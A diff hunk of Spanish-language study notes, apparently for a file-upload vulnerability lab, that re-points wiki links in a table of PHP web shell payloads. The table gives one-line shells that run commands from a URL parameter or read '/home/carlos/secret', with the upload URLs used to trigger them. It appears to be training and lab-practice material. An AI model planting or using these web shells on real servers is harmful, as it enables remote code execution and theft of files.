@@ -32,9 +32,9 @@
 
 | Archivo (en esta carpeta) | Payload | Cómo se llama (URL) |
 | ------------------------- | ------- | ------------------- |
-| [[example_best.php]] | `<?php system($_GET['command']); ?>` | `…/files/avatars/example_best.php?command=cat%20/home/carlos/secret` |
-| [[example.php]] | `<?php echo system($_GET['command']); ?>` | igual, `?command=…` (⚠ duplica la última línea) |
-| [[file-upload-vulnerabilities/exploit.php\|exploit.php]] | `<?php echo file_get_contents('/home/carlos/secret'); ?>` | `…/files/avatars/exploit.php` **(sin parámetro, ya lee el secreto)** |
+| [[scripts/example_best.php|example_best.php]] | `<?php system($_GET['command']); ?>` | `…/files/avatars/example_best.php?command=cat%20/home/carlos/secret` |
+| [[scripts/example.php|example.php]] | `<?php echo system($_GET['command']); ?>` | igual, `?command=…` (⚠ duplica la última línea) |
+| [[scripts/exploit.php|exploit.php]] | `<?php echo file_get_contents('/home/carlos/secret'); ?>` | `…/files/avatars/exploit.php` **(sin parámetro, ya lee el secreto)** |
 | [[polyglot-web-shell-rce/build_polyglot.py]] → `exploit.php` | `<?php echo system($_GET["cmd"]); ?>` | `…/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret` (ojo: param **`cmd`**) |
 
 ```bash
